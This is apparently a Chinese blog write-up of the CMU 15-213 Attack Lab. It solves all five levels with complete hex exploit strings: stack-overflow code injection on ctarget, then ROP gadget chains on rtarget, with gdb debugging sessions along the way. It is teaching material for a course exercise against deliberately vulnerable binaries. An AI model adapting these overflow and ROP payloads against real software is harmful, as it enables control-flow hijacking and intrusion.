---
title: "CMU-15213-AttackLab"
date: 2025-08-17 20:29:00
categories:
- CMU-lab
- 15213
- AttackLab
tags: [CMU-lab, c, 汇编, 反编译, Exploit String Attack]
---

# CMU15213-AttackLab

## AttackLab

与BombLab类似，先看writeup，再看readme，最后看target中的readme
共计三个可执行文件 `hex2raw`，`ctarget`，`rtarget`。

writeup中先看`ctarget`文件。

在本地运行
```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
```

error input1 // input sufficiently  short
![err1](https://s2.loli.net/2025/08/14/o7tH3iuDPR8Ufkr.png)

error input2 // input too long
![err2](https://s2.loli.net/2025/08/14/957KduTJO8chMiG.png)

correctly input
![correct](https://s2.loli.net/2025/08/14/INaRLVKm9ny5JPZ.png)

c/rtarget都是这样使用，其中
farm.c：目标“小工具农场”的源代码，您将使用它来生成面向返回的编程攻击。
cookie.txt：一个 8 位十六进制代码，您将用作攻击中的唯一标识符。
rtarget：易受面向返回编程攻击的可执行程序（ROP attack）
ctarget：易受代码注入攻击的可执行程序 (CI attack)
README.txt：描述目录内容的文件
hex2raw：生成攻击字符串的实用程序。

**漏洞利用字符串时不得在中间的任何位置包含0x0a**，因为这是'\n'的ASCII值。gets()函数将默认认为打算终止字符串。

随后给出了两个可执行文件对应的level tasks summary
![level summary](https://s2.loli.net/2025/08/14/LlFYaAOmRZfjVIW.png)

本地使用，也就是自学时，使用`-q`参数跳过服务器过程

由于Attack Lab存在诸多国内正常CS课程不会教授的内容，因此，这里补充CourseNotes，若已经学过这一部分，请跳转至[记录](#记录)

## CourseNotes

[course-note 05-09-machine](../course-note/05-09-machine.md)

## 记录

首先`objdump -d <file-name>` dump出`ctarget`,`rtarget`的disassembly code [ctarget.d](../../../src/Attack-Lab/ctarget.d),[rtarget.d](../../../src/Attack-Lab/rtarget.d)。

### Level 1

任务并不需要注入新的代码，而是重定向程序区执行现存的过程

> Function getbuf is called within CTARGET by a function test having the following C code:
>
> ![test](https://s2.loli.net/2025/08/17/IcBte3RCQnFSND1.png)
> When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget, there is code for a function touch1 having the following C representation:
> ![touch1](https://s2.loli.net/2025/08/17/JGKwRTcDE2Hn8fZ.png)
> Your task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. Note that your exploit string may also corrupt parts of the stack not directly related to this stage, but this will not cause a problem, since touch1 causes the program to exit directly.

简单的用中文说，就是将getbuf的ret改成执行touch1

我们先尝试执行一遍ctarget
向ctarget.l1.txt填入以下内容
```txt
ef be ad de
```

然后执行命令
```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./hex2raw < ctarget.l1.txt | ./ctarget -q
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
```
肯定是失败的，然后gdb看一下test函数

然后设计一下如何使用cgdb调试
基本上通过2种方式

1. 通过 run

```shell
(gdb) run -q < <(./hex2raw < ctarget.l1.txt)
```

> 这里用到的`<()`会将输出变为一个临时文件
> 
> 相当于下面这个方式创建的中间文件

2. 通过中间文件
```shell
./hex2raw < ctarget.l1.txt > payload.raw
(gdb) set args -q
(gdb) run < payload.raw
```

这里我们就采用第一种方式

***这里遇到了两个小问题，通过gdb搞清楚了背后的原因，有一些小知识点，有关输入流和linux临时文件***，如果你没有遇到该问题，可以跳转[gdb解决了该问题后](#gdb解决了该问题后)

先不打断点运行看是否正常

```shell
(gdb) run -q < <(./hex2raw < ctarget.l1.txt)
Starting program: /home/ubuntu/learnning_project/CMU-15213/src/Attack-Lab/ctarget -q < <(./hex2raw < ctarget.l1.txt)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Cookie: 0x59b997fa

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:", ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
1244    ./stdio-common/vfprintf-internal.c: No such file or directory.
```

我们直接`c`

```shell
(gdb) c
Continuing.
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
[Inferior 1 (process 1553765) exited with code 01]
```

再尝试b test,然后运行，发现还是一样。
我们看一下cgdb爆出一堆奇怪东西的bt
```shell
(gdb) bt
#0  0x00007ffff7dff0d0 in __vfprintf_internal (s=0x7ffff7fa5780 <_IO_2_1_stdout_>, format=0x4032b4 "Type string:",
    ap=ap@entry=0x5561dbd8, mode_flags=mode_flags@entry=2) at ./stdio-common/vfprintf-internal.c:1244
#1  0x00007ffff7ebec4b in ___printf_chk (flag=flag@entry=1, format=format@entry=0x4032b4 "Type string:") at ./debug/printf_chk.c:33
#2  0x0000000000401f10 in printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
#3  launch (offset=<optimized out>) at support.c:293
#4  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
```
可见在stable_launch就挂在奇怪的地方了

加两个断点`main`和`stable_launch`
一步步调试，发现根本没有进入test函数，猜测输入有问题，于是可以尝试

```shell
./hex2raw c< target.l1.txt
```

发现没有输入，这里记得最后输入一个回车：）

但是仍然没有作用，尝试分析一下dump文件，可见test启动于launch函数，而launch函数被stable_launch调用，程序应该是在launch调用test前就已经segment fault导致触发了一系列的输出。

```shell
 1│ Dump of assembler code for function launch:
 2│ support.c:
 3│ 285     in support.c
 4│    0x0000000000401eb4 <+0>:     push   %rbp
 5│    0x0000000000401eb5 <+1>:     mov    %rsp,%rbp
 6│    0x0000000000401eb8 <+4>:     sub    $0x10,%rsp
 7│    0x0000000000401ebc <+8>:     mov    %rdi,%rdx
 8│    0x0000000000401ebf <+11>:    mov    %fs:0x28,%rax
 9│    0x0000000000401ec8 <+20>:    mov    %rax,-0x8(%rbp)
10│    0x0000000000401ecc <+24>:    xor    %eax,%eax
11│
12│ 286     in support.c
13│    0x0000000000401ece <+26>:    lea    0x1e(%rdi),%rax
14│    0x0000000000401ed2 <+30>:    and    $0xfffffffffffffff0,%rax
15│    0x0000000000401ed6 <+34>:    sub    %rax,%rsp
16│    0x0000000000401ed9 <+37>:    lea    0xf(%rsp),%rdi
17│    0x0000000000401ede <+42>:    and    $0xfffffffffffffff0,%rdi
18│
19│ /usr/include/x86_64-linux-gnu/bits/string3.h:
20│    0x0000000000401ee2 <+46>:    mov    $0xf4,%esi
21│    0x0000000000401ee7 <+51>:    call   0x400d00 <memset@plt>
22│
23│ support.c:
24│    0x0000000000401eec <+56>:    mov    0x2025ad(%rip),%rax        # 0x6044a0 <stdin@@GLIBC_2.2.5>
25│    0x0000000000401ef3 <+63>:    cmp    %rax,0x2025d6(%rip)        # 0x6044d0 <infile>
26├──> 0x0000000000401efa <+70>:    jne    0x401f10 <launch+92>
```
最终在infile launch+70行发现了the root fault，继续`si`结果如下。

```shell
(gdb) si
printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
105       return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,
(gdb) bt
#0  printf (__fmt=0x4032b4 "Type string:") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:105
#1  launch (offset=<optimized out>) at support.c:293
#2  0x0000000000401ffa in stable_launch (offset=<optimized out>) at support.c:340
Backtrace stopped: Cannot access memory at address 0x55686000
```

```shell
# ifdef __va_arg_pack
102│ __fortify_function int
103│ fprintf (FILE *__restrict __stream, const char *__restrict __fmt, ...)
104│ {
105├─> return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,
106│                         __va_arg_pack ());
107│ }
```

对这里`display $eflag`可知，这个cmp判断相等，随后就导致了错误

查询`ctarget.d`，可知执行过的launch函数如下
```shell
0000000000401eb4 <launch>:
  401eb4:	55                   	push   %rbp
  401eb5:	48 89 e5             	mov    %rsp,%rbp
  401eb8:	48 83 ec 10          	sub    $0x10,%rsp
  401ebc:	48 89 fa             	mov    %rdi,%rdx
  401ebf:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
  401ec6:	00 00 
  401ec8:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  401ecc:	31 c0                	xor    %eax,%eax
  401ece:	48 8d 47 1e          	lea    0x1e(%rdi),%rax
  401ed2:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
  401ed6:	48 29 c4             	sub    %rax,%rsp
  401ed9:	48 8d 7c 24 0f       	lea    0xf(%rsp),%rdi
  401ede:	48 83 e7 f0          	and    $0xfffffffffffffff0,%rdi
  401ee2:	be f4 00 00 00       	mov    $0xf4,%esi
  401ee7:	e8 14 ee ff ff       	call   400d00 <memset@plt>
  401eec:	48 8b 05 ad 25 20 00 	mov    0x2025ad(%rip),%rax        # 6044a0 <stdin@GLIBC_2.2.5>
  401ef3:	48 39 05 d6 25 20 00 	cmp    %rax,0x2025d6(%rip)        # 6044d0 <infile>
  401efa:	75 14                	jne    401f10 <launch+0x5c>
```

考虑将gdb时的汇编丢给ai，问一下含义
```shell
23│ support.c:
24│    0x0000000000401eec <+56>:    mov    0x2025ad(%rip),%rax        # 0x6044a0 <stdin@@GLIBC_2.2.5>
25│    0x0000000000401ef3 <+63>:    cmp    %rax,0x2025d6(%rip)        # 0x6044d0 <infile>
26│    0x0000000000401efa <+70>:    jne    0x401f10 <launch+92>
```

简单理解，这里是一个SPJ（spacial judge），判断输入文件是否是输入流，是则做特殊执行。

我们通过以下命令查看两边的值以及输入流的值，发现确实是都是输入流的值，因此，这里可能直接触发了特殊判断然后进了segment fault，网上都没有提到这一点。

```shell
x/x $rip + 0x2025d6
p/x $rax
p/x stdin
```

随后，可以尝试通过查看我们问题的二次复现
```shell
./ctarget -q <(./hex2raw < ./ctarget.l1.txt)
```
发现这个和gdb一致，也会存在问题

###### gdb解决了该问题后

尝试一下调用，发现现在会调用test函数了，但是和`write-up`中写的仍有出入。

```shell
./ctarget -q -i <(./hex2raw < <(echo "00 00 00 00 00 ac"))
```

通过该命令即可解决无法成功运行的问题

总结一下解决方案，就是严格按照`write-up`中写的参数调用即可，包括输入流为文件的情况。

现在就可以开始正式的调试了。

这个比上面要简单,首先打个getbuf断点

```shell
 1│ Dump of assembler code for function getbuf:
 2│ buf.c:
 3│ 12      in buf.c
 4├──> 0x00000000004017a8 <+0>:     sub    $0x28,%rsp
```

可见开了一个40字节的栈帧。
然后我们直接查看touch1的地址即可

三种方式
```shell
(gdb) p touch1
$17 = {void ()} 0x4017c0 <touch1>
(gdb) info address touch1
Symbol "touch1" is a function at address 0x4017c0.
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget | grep touch1
00000000004017c0 T touch1
```
然后遵循字节序，赋值一下 ctarget.l1.txt

```shell
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00 
```

这里有回车也没关系

```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q -i <(./hex2raw < ctarget.l1.txt)
Cookie: 0x59b997fa
Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00
```

### Level 2

需要注入一小段代码，作为exploit string的一部分

> Within the file `ctarget` there is code for a function `touch2` having the following C representation:
> ![touch2](https://s2.loli.net/2025/08/17/sX8wJCQLAl53W9c.png)
>
> Your task is to get `CTARGET` to execute the code for `touch2` rather than returning to `test`. In this case, however, you must make it appear to `touch2` as if you have passed your cookie as its argument.
> 
> Do not attempt to use `jmp` or `call` instructions in your exploit code. The encodings of destination addresses for these instructions are difficult to formulate. Use `ret` instructions for all transfers of control, even when you are not returning from a call.

简单的用中文说，就是通过返回值调用touch2，同时传入参数——我们自己的cookie，限制使用jmp和call


首先查询cookie的地址值，touch2的地址值
```shell
(gdb) p/x &cookie
$20 = 0x6044e4
(gdb) p touch2 
$21 = {void (unsigned int)} 0x4017ec <touch2>
```

然后尝试去编写注入代码
```assembly
movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi
pushq   $0x4017ec
ret
```

```assembly
main:
        movq	$0x59b997fa, %rdi
        pushq	$0x4017ec
        ret
```
然后编译并objdump
```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l2.s 
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d injection.l2.o

injection.l2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <main>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret    
```
将dump出的机械码写入答案，也就是getbuf写入函数的顶部,然后40个字节处写下rsp在调用gets时的地址值即可。

```shell
 1│ Dump of assembler code for function getbuf:
 2│ buf.c:
 3│ 12      in buf.c
 4│    0x00000000004017a8 <+0>:     sub    $0x28,%rsp
 5│
 6│ 13      in buf.c
 7│ 14      in buf.c
 8├──> 0x00000000004017ac <+4>:     mov    %rsp,%rdi

(gdb) x/gx $rsp
0x5561dc78:     0x0000000000000000
```

即最终答案为
```txt
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q -i <(./hex2raw < ctarget.l2.txt)
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
```

### Level 3

改成了传一个字符串参数

> Within the file `ctarget` there is code for functions hexmatch and `touch3` having the following C representations:
> ![hexmatch](https://s2.loli.net/2025/08/17/BVg468kxKLSZfJI.png)
> Your task is to get `CTARGET` to execute the code for `touch3` rather than returning to test. You must make it appear to `touch3` as if you have passed a string representation of your cookie as its argument.

避免去查ascii，这里有一个小技巧
```shell
man ascii
```

注意到hex_march这里有一个*s,随机在一个栈的位置取值，根据后面的写法，这里用sprintf完成了从unsigned到string的转变。并且重写了部分栈的区域。

利用test的栈就行，test有8个栈帧的空间，足够用了

查询必要的信息
```shell

ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ nm ./ctarget | grep touch3
00000000004018fa T touch3

 1│ Dump of assembler code for function test:
 2│ visible.c:
 3│ 90      in visible.c
 4│    0x0000000000401968 <+0>:     sub    $0x8,%rsp
 5│
 6│ 91      in visible.c
 7│ 92      in visible.c
 8├──> 0x000000000040196c <+4>:     mov    $0x0,%eax
(gdb) x/x $rsp
0x5561dca8:     0x0000000000000009
```

这里通过两个rsp的值相减，可以发现相差的rsp值在test与getbuf之间足足有48个栈帧。可见地址实际上由于padding的原因是补齐了4个字节的。

开始构造注入代码
```assembly
main:
	movq	0x5561dca8, %rdi
	pushq	$0x4018fa
	ret
```

然后相同的指令
```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c injection.l3.s 
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d injection.l3.o

injection.l3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <main>:
   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi
   7:   68 fa 18 40 00          push   $0x4018fa
   c:   c3                      ret  
```

然后构造exploit string，注意这里的排序，是顺序排的，从低到高。`strcmp`会解决这个字符串没有结尾的问题

```hex
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 DC 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ ./ctarget -q -i <(./hex2raw < ctarget.l3.txt)
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
```

基本上构造出来就对了

好！所有`ctarget`都做完了，**现在是另一种构造攻击了**

### Level 4

**Part II: Return-Oriented Programming**

这种面向返回的攻击要比代码注入攻击要难的多，CMU介绍其主要具有两种技术点

> -  It uses randomization so that the stack positions differ from one run to another. This makes it impossible to determine where your injected code will be located.
> - It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault
> 
> 基本是说rtarget的代码采用了课程中提到的两种防范exploit string的方式。randomization的偏移，这使得注入代码不能被定位，此外，它标记了被栈持有的内存段无法被执行。
> 
> 
![sequence of gatget](https://s2.loli.net/2025/08/18/IQMxRrSHa5Pv8om.png)
> 
> ~~为什么不用金丝雀，用了就很难攻击了~~

通过提取function tailing的机器码构建gatget，在farm中包含了一些函数，这些函数的特殊tailing使得他们很适合这种攻击，从名字可以看出，这是tools' farm。

可以尝试一下编译该文件
```shell
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ gcc -c farm.c 
ubuntu@VM-0-8-ubuntu:~/learnning_project/CMU-15213/src/Attack-Lab$ objdump -d farm.o > farm.d
```

随便看一个函数
```assembly
00000000000001c8 <addval_187>:
 1c8:	f3 0f 1e fa          	endbr64 
 1cc:	55                   	push   %rbp
 1cd:	48 89 e5             	mov    %rsp,%rbp
 1d0:	89 7d fc             	mov    %edi,-0x4(%rbp)
 1d3:	8b 45 fc             	mov    -0x4(%rbp),%eax
 1d6:	2d 77 31 c7 3f       	sub    $0x3fc73177,%eax
 1db:	5d                   	pop    %rbp
 1dc:	c3                   	ret    
```
可见相对于下面的rtarget莫名其妙调用了很多东西
```assembly
0000000000401a25 <addval_187>:
  401a25:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
  401a2b:	c3                   	ret    
```

可见其中存在诸多例如调用rbp寄存器等无效操作，以及多出了一个endbr64等指令

1. `endbr64`: 这是一个防范ROP Attack的指令
        - 它被插入到每个函数的入口处
        - CPU 在执行 ret 指令时，如果目标地址指向一条 endbr64 指令，才允许跳转
        - 如果 ret 跳转到了没有 endbr64 的地方（比如中间的 gadget），CPU 会触发 #CP 异常（Control Protection Fault），终止程序
2. `-O2`: 普通的编译命令通常不采用优化，因此为了满足标准的汇编程序格式会有许多无效操作，例如上述代码中的rbp

采用O2优化`-O2`以及禁用CET`-fcf-protection=none`后
```assembly
0000000000000160 <addval_187>:
 164:	8d 87 89 ce 38 c0    	lea    -0x3fc73177(%rdi),%eax
 16a:	c3                   	ret    
 16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
```

` 16b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)`:这一句只是5字节的填充模板，intel推荐的NOP模板

| 填充字节 | 汇编                                       |
|------|------------------------------------------|
| 2    | 66 90→nopw %ax                           |
| 3    | 0f 1f 00→nopl (%rax)                     |
| 4    | 0f 1f 40 00→nopl 0x0(%rax)               |
| 5    | 0f 1f 44 00 00→nopl 0x0(%rax,%rax,1)     |
| 6    | 66 0f 1f 44 00 00→nopw 0x0(%rax,%rax,1)  |

这样看就和rtarget很近似了

然后看一下Level 4的题面

重复Level 2的操作

`TIPs`: 
1. 所有gadgets都可以在rtarget中找到，这块区域由start_farm和end_farm划分
2. 秩序两个工具完成该攻击
3. 漏洞利用代码应包含小工具地址和数据的组合

recall一下Level 2的汇编
```assembly
movq    $59b997fa, %rdi #或movq 0x6044e4 %rdi
pushq   $0x4017ec
ret
```

问题在于，如何把cookie中的立即数传进rdi

![Appendix](https://s2.loli.net/2025/08/18/IZM3zdxjB9u64Hl.png)

应该明确一些rules
1. 所有数据都被存放在栈中
2. 仅能通过返回值调用tailing代码

因此，立即数仅能被存放在栈中，并且仅能通过pop放置在寄存器中。
查表可知pop %rdi为5f。查询可知submitr函数中，有以5f结尾,地址为402b19。
查询touch2地址为4017ec

直接构造
```hex
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
19 2b 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
ec 17 40 00 00 00 00 00
```

理论上这是正确的，在调用touch2时rdi被赋值为正确的值。但是用到了并非tools `farm` 中的函数，实际运行发生了意料之外的`segment fault`

尝试另一种解法，通过rax作为中间函数,通过`ROP`构造这样的gadget序列
```assembly
pop %rax
mov %rax %rdi
ret
```

```hex
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```

这个就对了，可以尝试比较这两个输入的执行流

首先查看一下这个PASS的执行流，可见其在执行完cmp`coockie`和edi后jne顺利跳转到visible文件的段中
```assembly
21│ visible.c:
22│    0x0000000000401818 <+44>:    mov    $0x2,%edi
23│    0x000000000040181d <+49>:    call   0x401dad <validate>
24│    0x0000000000401822 <+54>:    jmp    0x401842 <touch2+86>
```
该处执行到call后跳转至

```assembly
│ 48      in visible.c
38│ 49      in visible.c
39├──> 0x0000000000401842 <+86>:    mov    $0x0,%edi
40│    0x0000000000401847 <+91>:    call   0x400e40 <exit@plt>
```

随后执行到exit结束

然后看一下上面那个错误的执行流,则在比较完edi与rip后直接跳转到了系统库的stdio2.h中
```
14│ /usr/include/x86_64-linux-gnu/bits/stdio2.h:
15│ 105       return __fprintf_chk (__stream, __USE_FORTIFY_LEVEL - 1, __fmt,
16├──> 0x0000000000401804 <+24>:    mov    $0x403208,%esi
17│    0x0000000000401809 <+29>:    mov    $0x1,%edi
18│    0x000000000040180e <+34>:    mov    $0x0,%eax
19│    0x0000000000401813 <+39>:    call   0x400df0 <__printf_chk@plt>
```
可见两者在比较完rip,edi中出现了不同，探索更多信息

以下是正常PASS也就是通过rax传参的具体参数
```shell
rax            0x59b997fa          1505335290
rbx            0x7fffffffdce8      140737488346344
rcx            0xd6                214
rdx            0x59b997fa          1505335290
rsi            0x30                48
rdi            0x59b997fa          1505335290
rbp            0x7fffffffdba0      0x7fffffffdba0
rsp            0x7ffffffca330      0x7ffffffca330
r8             0xa                 10
r9             0x607890            6322320
r10            0x77                119
r11            0x246               582
r12            0x4                 4
r13            0x0                 0
r14            0x0                 0
r15            0x7ffff7ffd040      140737354125376
rip            0x401802            0x401802 <touch2+22>
--Type <RET> for more, q to quit, c to continue without paging-- 

(gdb) x/16gx $rsp
0x7ffffffca330: 0x00000000004017ec      0xf4f4f4f4f4f4f400
0x7ffffffca340: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffca350: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffca360: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffca370: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffca380: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffca390: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffffca3a0: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

```shell
rax            0x1                 1
rbx            0x7fffffffdce8      140737488346344
rcx            0xbe                190
rdx            0x59b997fa          1505335290
rsi            0x30                48
rdi            0x59b997fa          1505335290
rbp            0x7fffffffdba0      0x7fffffffdba0
rsp            0x7ffffff98da8      0x7ffffff98da8
r8             0xa                 10
r9             0x607890            6322320
r10            0x77                119
r11            0x246               582
r12            0x4                 4
r13            0x0                 0
r14            0x0                 0
r15            0x7ffff7ffd040      140737354125376
rip            0x401802            0x401802 <touch2+22>
--Type <RET> for more, q to quit, c to continue without paging--

(gdb) x/16gx $rsp
0x7ffffff98da8: 0x00000000004017ec      0xf4f4f4f4f4f4f400
0x7ffffff98db8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffff98dc8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffff98dd8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffff98de8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffff98df8: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffff98e08: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x7ffffff98e18: 0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```

这里推荐一个软件`Beyond Compare`。
![compare](https://s2.loli.net/2025/08/18/4wK2YdaZDU3Mbvy.png)

可见这里主要是rsp的值相差很多，其次是rax，rcx的值不相同。可以考虑rsp的值为偏移加调用ret数量不同的结果，rax为调用命令导致的cookie存放，但无法解释rcx的变化，考虑display $rcs，重新运行执行PASS，FAILED版本的exploit string。

可见rcx稳定的保持在214与190。考虑查看哪里修改了它

查询到Gets函数中更改了rcx
```assembly
 ~│
 1│ Dump of assembler code for function getbuf:
 2│ buf.c:
 3│ 12      in buf.c
 4│    0x00000000004017a8 <+0>:     sub    $0x28,%rsp
 5│    
 6│ 13      in buf.c
 7│ 14      in buf.c
 8│    0x00000000004017ac <+4>:     mov    %rsp,%rdi
 9├──> 0x00000000004017af <+7>:     call   0x401b60 <Gets>
10│ 
11│ 15      in buf.c
12│ 16      in buf.c
13│    0x00000000004017b4 <+12>:    mov    $0x1,%eax
14│    0x00000000004017b9 <+17>:    add    $0x28,%rsp
15│    0x00000000004017bd <+21>:    ret
16│ End of assembler dump.
```

从中找出原因超出了目前我的技术水平，从调用栈中`chk`字样只能猜测其对ROP的构造做了检查然后直接触发了SIGSEGV信号。

### Level 5

> You have also gotten 95/100 points for the lab. That’s a good score. If you have other pressing obligations consider stopping right now.

***HAHAHA!***,还要再战！简直就是提振精神的。

Level5 要求与Level3 相同，使用cookie字符串指针调用touch3

`Tips`：
1. 需要八个gadgets
2. 用到movl

review一下level3的代码
```assembly
movq	$0x5561dca8, %rdi
pushq	$0x4018fa
ret
```
这里可能已经忘记了0x5561dca8是什么，这是cookie存在栈中的地址，而0x4018fa是touch3的地址

> `nm ./rtarget | grep`可以发现touch3的地址是一样的。

应该如何存放cookie？注意这里存放的时候同样要考虑touch3中对栈的随机占用问题。

如果将其放置在栈中，我们将不知道cookie的地址。唯一相关的方式是获取rsp的地址值然后计算好偏移量。



构造一下相关的汇编代码
```assembly
movq %rsp %rax
movq %rax %rdi
popq %rax # 取偏移地址
movl %eax %edi
movl %ecx %esi
lea    (%rdi,%rsi,1),%rax
movq %rax, %rdi
```

找一找相关的gadget

```assembly
401aad: movq %rsp %rax # 此时rsp已经弹出一个值
4019a2: movq %rax %rdi
        0x48 # 偏移地址
4079cc: popq %rax # 取偏移地址
4019dd: movl %eax %edx
401a70: movl %edx %ecx 
401a13: movl %ecx %esi
4019d6: lea  (%rdx,%rsi,1),%rax
4019a2: movq %rax, %rdi
        35 39 62 39 39 37 66 61 # Cookie

```

![level5](https://s2.loli.net/2025/08/18/jQvp85anBgSET9R.png)

构造
```shell
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
ad 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
```

***最终***

```shell
